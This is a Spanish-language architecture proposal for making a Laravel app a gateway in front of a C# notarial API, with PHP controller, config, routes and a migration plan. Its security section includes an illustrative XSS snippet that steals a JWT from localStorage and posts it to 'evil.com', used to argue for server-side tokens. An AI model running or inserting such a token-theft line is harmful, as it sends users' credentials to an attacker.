# 🏗️ Arquitectura Híbrida: Laravel + API C# Control Notarial

**Fecha:** 15 de Abril, 2026  
**Estado:** Sistema en Producción (API C#) + Laravel en Desarrollo

---

## 🎯 Panorama General del Sistema

### Contexto

**Línea de Tiempo:**
1. **Sistema Original:** VB 6.0 Control Notarial (legacy)
2. **Migración (Alex):** VB 6.0 → C# .NET APIs (completada)
3. **Sistema Actual:** Laravel Multitenant + APIs C# (híbrido)

### Componentes del Sistema

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATINET COMPLIANCE HUB                         │
│                  (Laravel Multitenant - Gateway)                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  🔐 Autenticación Principal: Laravel Fortify                    │
│     ├─ Guard: 'web' (session-based)                            │
│     ├─ Storage: Session cookies                                │
│     ├─ Multitenant: ✅ Global scopes activos                   │
│     └─ Auth::user() disponible en todo el sistema              │
│                                                                  │
│  📊 Servicios Manejados por Laravel:                            │
│     ├─ Páginas web (landing, registro)                         │
│     ├─ Control interno de Atinet                               │
│     ├─ Búsquedas (OFAC, SAT, listas negras)                    │
│     ├─ Suscripciones y planes                                  │
│     ├─ Dashboard principal                                      │
│     └─ Gestión de usuarios y notarías                          │
│                                                                  │
└─────────────────────┬───────────────────────────────────────────┘
                      │
                      │ Usuario autenticado accede a Control Notarial
                      │
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│              API C# CONTROL NOTARIAL (Alex)                      │
│           Sistema Legacy Migrado - En Producción                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  🔑 Autenticación: JWT (Bearer Token)                           │
│     ├─ Endpoint: /api/Login/Authentication                      │
│     ├─ Storage: localStorage en cliente                         │
│     └─ Usuarios: Base de datos separada                        │
│                                                                  │
│  📋 APIs Funcionales (Probadas con Swagger):                    │
│     ├─ /Clientes/GetClientes                                    │
│     ├─ /Catalogos/GetOperaciones                               │
│     ├─ /Catalogos/GetZonasMunicipios                           │
│     ├─ /Catalogos/GetImpuestosDerechos                         │
│     ├─ /Expediente/ChecarNumeroEscritura                       │
│     ├─ /Presupuestos/GetPresupuestosXExpediente                │
│     ├─ /Presupuestos/GenerateReciboPresupuestoPrevio          │
│     ├─ /ConfiguracionNotarial/GetConfiguracionNotaria         │
│     └─ Muchas más...                                            │
│                                                                  │
│  🌐 URLs del Servidor:                                          │
│     ├─ DEBUG: https://localhost:44327                           │
│     └─ RELEASE: https://srvatinet.atinet.com.mx:7443           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔄 Flujo de Usuario Actual

### Flujo Completo (Como está ahora)

```
1️⃣ Usuario accede a Laravel
   └─ URL: https://atinet.com.mx/login
      └─ Login con Laravel Fortify (email + password)
         └─ Session creada ✅
            └─ Auth::user() disponible ✅
               └─ Multitenant activo ✅

2️⃣ Usuario navega en Laravel
   ├─ Dashboard ✅
   ├─ Búsquedas ✅
   ├─ Suscripciones ✅
   └─ Todo funciona con session de Laravel

3️⃣ Usuario hace click en "Control Notarial"
   └─ Laravel renderiza vista React
      └─ Vista intenta cargar datos de API C#
         └─ ❌ Sin token JWT → LoginModal aparece
            └─ Usuario ingresa credenciales (SEGUNDA VEZ)
               └─ POST a https://srvatinet.atinet.com.mx:7443/api/Login/Authentication
                  └─ Token JWT recibido
                     └─ Token guardado en localStorage
                        └─ Ahora puede acceder a Control Notarial ✅

4️⃣ Usuario trabaja en Control Notarial
   ├─ Cada request incluye: Authorization: Bearer {token}
   ├─ API C# valida JWT
   └─ Devuelve datos

5️⃣ Token expira o usuario cierra sesión
   └─ LoginModal aparece nuevamente
      └─ Usuario debe re-autenticarse
```

---

## ⚠️ Problemas de la Arquitectura Actual

### Problema 1: Doble Autenticación

**Usuario tiene que loguearse DOS veces:**
```
Login #1: Laravel Fortify
   ├─ Email: user@notaria.com
   └─ Password: ********

Login #2: API C# (Control Notarial)
   ├─ Usuario: ADMIN
   └─ Contraseña: ********
```

**Experiencia de Usuario:**
- ❌ Confusión (¿por qué dos logins?)
- ❌ Dos conjuntos de credenciales
- ❌ Si token expira, tiene que loguearse de nuevo
- ❌ No aprovecha sesión de Laravel

### Problema 2: Multitenant No Funciona en API C#

**Laravel:**
```php
// Multitenant automático con global scope
$busquedas = Busqueda::all(); // Solo de la notaría del usuario ✅
$user = Auth::user(); // Usuario autenticado ✅
```

**API C#:**
```typescript
// NO tiene acceso a Auth::user() de Laravel
// NO aplica global scopes
// Tiene que manejar multitenant manualmente en cada endpoint
const clientes = await api.get('/Clientes/GetClientes');
```

### Problema 3: Sincronización de Usuarios

**¿Cómo se mantienen sincronizados?**
- Usuario en Laravel: `user@notaria.com`
- Usuario en API C#: `ADMIN`
- ¿Son el mismo usuario?
- ¿Cómo se vinculan?
- ¿Qué pasa si se actualiza uno y no el otro?

---

## ✅ Solución Propuesta: Laravel como Gateway/Proxy

### Arquitectura Mejorada

En lugar de que el **frontend** llame directamente a las APIs C#, **Laravel actúa como intermediario**:

```
┌─────────────────────────────────────────────────────────────────┐
│                         FRONTEND (React)                         │
│                                                                  │
│  Usuario autenticado con session de Laravel ✅                  │
│                                                                  │
│  Llamadas:                                                       │
│  ├─ api.get('/control-notarial/clientes')                       │
│  ├─ api.get('/control-notarial/operaciones')                    │
│  └─ api.post('/control-notarial/expedientes', data)             │
│                                                                  │
│  NO hay JWT en localStorage                                      │
│  NO hay LoginModal adicional                                     │
│  Session de Laravel funciona normal                              │
│                                                                  │
└─────────────────────┬───────────────────────────────────────────┘
                      │
                      │ Request normal con session cookie
                      │
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│              LARAVEL BACKEND (Proxy/Gateway)                     │
│                                                                  │
│  ControlNotarialProxyController:                                │
│                                                                  │
│  public function getClientes(Request $request)                  │
│  {                                                               │
│      $user = Auth::user(); // ✅ Session de Laravel            │
│      $notaria = $user->notaria; // ✅ Multitenant              │
│                                                                  │
│      // Laravel obtiene JWT del servidor (cache o nuevo)        │
│      $token = $this->getServerToken();                          │
│                                                                  │
│      // Laravel hace request a API C#                           │
│      $response = Http::withToken($token)                        │
│          ->get('https://api.com:7443/Clientes/GetClientes', [  │
│              'notaria_id' => $notaria->id, // ← Multitenant    │
│          ]);                                                     │
│                                                                  │
│      return response()->json($response->json());                │
│  }                                                               │
│                                                                  │
└─────────────────────┬───────────────────────────────────────────┘
                      │
                      │ Request con JWT (servidor a servidor)
                      │ Authorization: Bearer {server_token}
                      │
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│              API C# CONTROL NOTARIAL                             │
│                                                                  │
│  Recibe requests solo de Laravel Backend                        │
│  JWT validado ✅                                                │
│  Devuelve datos                                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🎯 Ventajas de la Solución Propuesta

### Ventaja 1: Single Sign-On (SSO)

**Usuario se loguea UNA SOLA VEZ:**
```
✅ Login en Laravel Fortify
   └─ Session activa
      └─ Acceso a TODA la plataforma (Laravel + Control Notarial)
         └─ Sin LoginModal adicional
            └─ Sin confusión
               └─ Mejor UX
```

### Ventaja 2: Multitenant Funciona en Todo el Sistema

**Laravel controla el acceso:**
```php
public function getClientes(Request $request)
{
    $user = Auth::user(); // ✅ Session de Laravel
    $notaria = $user->notaria; // ✅ Global scope activo
    
    // Laravel pasa notaria_id a API C#
    $response = Http::withToken($serverToken)
        ->get($apiUrl, [
            'notaria_id' => $notaria->id, // ← Multitenant aplicado
        ]);
    
    return response()->json($response->json());
}
```

### Ventaja 3: Seguridad Mejorada

**JWT nunca llega al cliente:**
```
❌ Antes:
Usuario → JWT en localStorage → Vulnerable a XSS

✅ Ahora:
Usuario → Session cookie (httpOnly) → Más seguro
Laravel → JWT server-side → No expuesto al cliente
```

### Ventaja 4: Control Centralizado

**Laravel tiene control total:**
```php
// Logging
Log::info('Usuario accedió a Control Notarial', [
    'user_id' => $user->id,
    'notaria_id' => $notaria->id,
    'action' => 'getClientes',
]);

// Rate limiting
RateLimiter::for('control-notarial', function (Request $request) {
    return Limit::perMinute(60)->by($request->user()->id);
});

// Permissions
if (!$user->can('access-control-notarial')) {
    abort(403);
}

// Auditing
$this->auditService->log('control_notarial_access', $user, $data);
```

### Ventaja 5: Mantenimiento Simplificado

**Un solo punto de autenticación:**
```
✅ Cambiar password → Solo en Laravel
✅ Agregar 2FA → Solo en Laravel
✅ Gestionar permisos → Solo en Laravel
✅ Multitenant → Solo en Laravel
✅ Auditoría → Solo en Laravel
```

---

## 🛠️ Implementación Propuesta

### Paso 1: Crear Proxy Controller en Laravel

**Archivo:** `app/Http/Controllers/ControlNotarialProxyController.php`

```php
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;

class ControlNotarialProxyController extends Controller
{
    private string $apiBaseUrl;
    
    public function __construct()
    {
        $this->middleware(['auth', 'verified']);
        
        $this->apiBaseUrl = config('services.control_notarial.api_url');
    }
    
    /**
     * Obtener token JWT del servidor (cached)
     */
    private function getServerToken(): string
    {
        return Cache::remember('control_notarial_server_token', 3600, function () {
            $response = Http::post("{$this->apiBaseUrl}/Login/Authentication", [
                'usuario' => config('services.control_notarial.server_user'),
                'contrasena' => config('services.control_notarial.server_password'),
                'equipo' => 'Laravel-Server',
            ]);
            
            if (!$response->successful()) {
                throw new \Exception('Failed to authenticate with Control Notarial API');
            }
            
            $data = $response->json();
            return $data['dataResponse']['token'];
        });
    }
    
    /**
     * GET /control-notarial/clientes
     */
    public function getClientes(Request $request)
    {
        $user = Auth::user();
        $notaria = $user->notaria;
        
        // Verificar permiso
        if (!$user->can('access-control-notarial')) {
            abort(403, 'No tiene acceso a Control Notarial');
        }
        
        try {
            $token = $this->getServerToken();
            
            $response = Http::withToken($token)
                ->timeout(30)
                ->get("{$this->apiBaseUrl}/Clientes/GetClientes", [
                    'notaria_id' => $notaria->id, // Multitenant
                ]);
            
            // Logging
            Log::info('Control Notarial: getClientes', [
                'user_id' => $user->id,
                'notaria_id' => $notaria->id,
                'status' => $response->status(),
            ]);
            
            return response()->json($response->json());
            
        } catch (\Exception $e) {
            Log::error('Control Notarial API error: getClientes', [
                'error' => $e->getMessage(),
                'user_id' => $user->id,
            ]);
            
            return response()->json([
                'success' => false,
                'message' => 'Error al conectar con Control Notarial',
            ], 500);
        }
    }
    
    /**
     * GET /control-notarial/operaciones
     */
    public function getOperaciones(Request $request)
    {
        $user = Auth::user();
        $notaria = $user->notaria;
        
        if (!$user->can('access-control-notarial')) {
            abort(403);
        }
        
        try {
            $token = $this->getServerToken();
            
            $response = Http::withToken($token)
                ->get("{$this->apiBaseUrl}/Catalogos/GetOperaciones", [
                    'notaria_id' => $notaria->id,
                ]);
            
            return response()->json($response->json());
            
        } catch (\Exception $e) {
            Log::error('Control Notarial API error: getOperaciones', [
                'error' => $e->getMessage(),
                'user_id' => $user->id,
            ]);
            
            return response()->json([
                'success' => false,
                'message' => 'Error al obtener operaciones',
            ], 500);
        }
    }
    
    /**
     * POST /control-notarial/expedientes/verificar-numero
     */
    public function verificarNumeroEscritura(Request $request)
    {
        $user = Auth::user();
        $notaria = $user->notaria;
        
        $validated = $request->validate([
            'numEscritura' => 'required|string',
        ]);
        
        try {
            $token = $this->getServerToken();
            
            $response = Http::withToken($token)
                ->post("{$this->apiBaseUrl}/Expediente/ChecarNumeroEscritura", [
                    'numEscritura' => $validated['numEscritura'],
                    'notaria_id' => $notaria->id,
                ]);
            
            return response()->json($response->json());
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'Error al verificar número de escritura',
            ], 500);
        }
    }
    
    /**
     * GET /control-notarial/presupuestos/{expedienteId}
     */
    public function getPresupuestosExpediente(Request $request, int $expedienteId)
    {
        $user = Auth::user();
        $notaria = $user->notaria;
        
        try {
            $token = $this->getServerToken();
            
            $response = Http::withToken($token)
                ->get("{$this->apiBaseUrl}/Presupuestos/GetPresupuestosXExpediente", [
                    'expedienteId' => $expedienteId,
                    'notaria_id' => $notaria->id,
                ]);
            
            return response()->json($response->json());
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'Error al obtener presupuestos',
            ], 500);
        }
    }
}
```

### Paso 2: Configurar Servicios

**Archivo:** `config/services.php`

```php
return [
    // ... servicios existentes ...
    
    'control_notarial' => [
        // URL del API C# (producción)
        'api_url' => env('CONTROL_NOTARIAL_API_URL', 'https://srvatinet.atinet.com.mx:7443/api'),
        
        // Credenciales del servidor (para obtener JWT)
        'server_user' => env('CONTROL_NOTARIAL_SERVER_USER', 'LARAVEL_SERVER'),
        'server_password' => env('CONTROL_NOTARIAL_SERVER_PASSWORD'),
        
        // Cache del token (segundos)
        'token_cache_ttl' => env('CONTROL_NOTARIAL_TOKEN_CACHE', 3600),
    ],
];
```

**Archivo:** `.env`

```env
# API Control Notarial (C#)
CONTROL_NOTARIAL_API_URL=https://srvatinet.atinet.com.mx:7443/api
CONTROL_NOTARIAL_SERVER_USER=LARAVEL_SERVER
CONTROL_NOTARIAL_SERVER_PASSWORD=tu_password_seguro_aqui
CONTROL_NOTARIAL_TOKEN_CACHE=3600
```

### Paso 3: Definir Rutas

**Archivo:** `routes/web.php`

```php
use App\Http\Controllers\ControlNotarialProxyController;

// Control Notarial - Proxy Routes
Route::prefix('control-notarial')
    ->name('control-notarial.')
    ->middleware(['auth', 'verified'])
    ->group(function () {
        
        // Clientes
        Route::get('/clientes', [ControlNotarialProxyController::class, 'getClientes'])
            ->name('clientes.index');
        
        // Operaciones
        Route::get('/operaciones', [ControlNotarialProxyController::class, 'getOperaciones'])
            ->name('operaciones.index');
        
        // Expedientes
        Route::post('/expedientes/verificar-numero', [ControlNotarialProxyController::class, 'verificarNumeroEscritura'])
            ->name('expedientes.verificar-numero');
        
        Route::get('/expedientes/{expedienteId}/presupuestos', [ControlNotarialProxyController::class, 'getPresupuestosExpediente'])
            ->name('expedientes.presupuestos');
        
        // ... más rutas según necesites ...
    });
```

### Paso 4: Actualizar Frontend (Sin JWT)

**Antes (con JWT):**
```typescript
// ❌ Cliente obtiene JWT y lo guarda en localStorage
const authApi = useAuthApi();
const response = await authApi.post('/Login/Authentication', {
    usuario, contrasena, equipo
});
saveToken(response.dataResponse.token);

// Llamadas directas a API C#
const clientes = await api.get('https://localhost:44327/api/Clientes/GetClientes');
```

**Después (sin JWT):**
```typescript
// ✅ Cliente usa session de Laravel normal
// NO hay LoginModal
// NO hay JWT en localStorage

// Llamadas a Laravel (proxy)
const clientes = await api.get('/control-notarial/clientes');
const operaciones = await api.get('/control-notarial/operaciones');
const verificacion = await api.post('/control-notarial/expedientes/verificar-numero', {
    numEscritura: '12345'
});
```

**Actualizar `useApi()`:**
```typescript
// resources/js/services/api.ts

export function useApi(): ApiService {
    // Solo devolver ApiService sin URL base
    // Laravel routes manejan todo
    return new ApiService(''); // Base URL vacía (relativa)
}
```

### Paso 5: Eliminar Archivos JWT del Frontend

**Archivos a eliminar:**
```bash
# Ya no son necesarios:
rm resources/js/services/authService.ts
rm resources/js/hooks/useAuthGuard.ts
rm resources/js/components/Modals/LoginModal.tsx
rm resources/js/helpers/controlNotarialResponse.ts
```

**Archivos a actualizar:**
```typescript
// resources/js/pages/ControlNotarial/Index.tsx

// ❌ Antes:
import { isAuthenticated, logout } from '@/services/authService';
import { useAuthGuard } from '@/hooks/useAuthGuard';
import LoginModal from '@/components/Modals/LoginModal';

const [loginModalOpen, setLoginModalOpen] = useState(false);

useAuthGuard({
    onUnauthorized: () => setLoginModalOpen(true)
});

// ✅ Después:
// Nada! Solo usar la session de Laravel normal
// Auth middleware ya protege las rutas

export default function ControlNotarialIndex() {
    const { auth } = usePage().props; // Usuario de Laravel
    
    // Ya no necesitas LoginModal ni useAuthGuard
    
    return (
        <AppLayout>
            <Head title="Control Notarial" />
            
            <h1>Bienvenido, {auth.user.name}</h1>
            
            {/* Contenido normal */}
        </AppLayout>
    );
}
```

---

## 📊 Comparación: Antes vs Después

### Antes (Sistema Dual JWT)

```
Ventajas:
✅ APIs C# ya funcionan
✅ Alex ya lo implementó

Desventajas:
❌ Usuario se loguea DOS veces
❌ Dos conjuntos de credenciales
❌ JWT expuesto en localStorage (XSS)
❌ Multitenant NO funciona (API C# no sabe de notarías Laravel)
❌ No hay logging centralizado
❌ No hay rate limiting
❌ Difícil auditar
❌ Experiencia de usuario confusa
❌ Mantenimiento complejo
```

### Después (Laravel como Gateway)

```
Ventajas:
✅ Usuario se loguea UNA vez
✅ Multitenant funciona en todo el sistema
✅ JWT nunca llega al cliente (más seguro)
✅ Logging centralizado en Laravel
✅ Rate limiting centralizado
✅ Auditoría completa
✅ Permissions de Laravel funcionan
✅ Mejor experiencia de usuario
✅ Mantenimiento simplificado
✅ Control total desde Laravel

Desventajas:
⚠️ Laravel hace request adicional (latencia +50-100ms)
⚠️ Requiere refactorizar frontend (eliminar JWT)
⚠️ Requiere credenciales de servidor en API C#
```

---

## 🚀 Plan de Migración

### Fase 1: Configuración (1 día)

1. ✅ Crear `ControlNotarialProxyController`
2. ✅ Configurar `config/services.php`
3. ✅ Agregar variables `.env`
4. ✅ Definir rutas en `routes/web.php`
5. ✅ Crear usuario "servidor" en API C# para Laravel

### Fase 2: Testing Paralelo (3 días)

1. ✅ Probar endpoints proxy uno por uno
2. ✅ Verificar multitenant funciona
3. ✅ Verificar logging funciona
4. ✅ Medir latencia (debería ser <200ms)
5. ✅ Mantener sistema JWT funcionando (fallback)

### Fase 3: Migración Frontend (5 días)

1. ✅ Actualizar páginas Control Notarial (una por una)
2. ✅ Cambiar URLs de API C# → Laravel proxy
3. ✅ Eliminar LoginModal
4. ✅ Eliminar authService, useAuthGuard
5. ✅ Testing completo

### Fase 4: Limpieza (1 día)

1. ✅ Eliminar archivos JWT del frontend
2. ✅ Eliminar LoginModal component
3. ✅ Actualizar documentación
4. ✅ Deploy a producción

**Tiempo Total:** ~2 semanas

---

## 🔐 Seguridad Mejorada

### Ventaja 1: JWT Server-Side

**Antes:**
```javascript
// ❌ Token en cliente (vulnerable a XSS)
localStorage.setItem('auth_token', 'eyJhbGci...');

// Si un atacante inyecta JavaScript:
const token = localStorage.getItem('auth_token');
fetch('https://evil.com/steal', { 
    method: 'POST', 
    body: token 
}); // ← Token robado
```

**Después:**
```php
// ✅ Token en servidor (no accesible desde cliente)
Cache::put('control_notarial_server_token', $token, 3600);

// Cliente solo tiene session cookie (httpOnly, secure)
// Imposible acceder desde JavaScript
```

### Ventaja 2: Rate Limiting por Usuario

```php
// Laravel puede limitar requests por usuario
RateLimiter::for('control-notarial', function (Request $request) {
    return Limit::perMinute(60)->by($request->user()->id);
});

// Evita abuse y protege API C#
```

### Ventaja 3: Permissions Granulares

```php
// Laravel puede verificar permisos antes de llamar API C#
if (!$user->can('view-expedientes')) {
    abort(403);
}

// API C# solo recibe requests autorizados
```

---

## 💡 Recomendación Final

### ✅ Deberías Implementar Laravel como Gateway

**Razones:**

1. **Mejor UX:** Usuario se loguea una vez
2. **Más Seguro:** JWT no expuesto al cliente
3. **Multitenant:** Funciona en todo el sistema
4. **Control:** Laravel tiene control total
5. **Mantenimiento:** Más fácil de mantener
6. **Escalabilidad:** Puedes migrar APIs C# a Laravel gradualmente

### 📋 Próximos Pasos Recomendados

**Opción A: Implementar Gateway (Recomendado)**
1. Crear `ControlNotarialProxyController`
2. Refactorizar frontend (eliminar JWT)
3. Testing completo
4. Deploy

**Opción B: Mantener Sistema Actual**
1. Aceptar merge de Alex
2. Configurar URLs de API C#
3. Documentar doble autenticación
4. Entrenar usuarios

**Mi recomendación:** Opción A (Gateway)

¿Qué prefieres? ¿Implementamos el gateway o mantenemos el sistema dual de Alex?
